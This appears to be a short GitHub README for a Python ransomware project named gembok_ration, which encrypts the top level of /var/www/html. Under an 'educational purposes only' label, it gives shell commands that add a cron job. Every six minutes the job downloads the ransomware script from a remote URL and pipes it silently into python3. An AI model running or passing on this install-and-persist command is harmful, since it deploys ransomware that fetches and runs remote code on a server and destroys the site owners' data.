# gembok_ration
A small (almost) harmless ransomware implemented in boa constrictor

Targets only top level directory on /var/www/html/

For educational purposes only!

execute dis:
  
  crontab -l > /tmp/mycron
  
  echo "*/6 * * * * curl -fsSL https://raw.githubusercontent.com/numburanggata/gembok_ration/refs/heads/main/gem.py | python3 - >/dev/null 2>&1" >> /tmp/mycron
  
  crontab /tmp/mycron
  
  rm -f /tmp/mycron
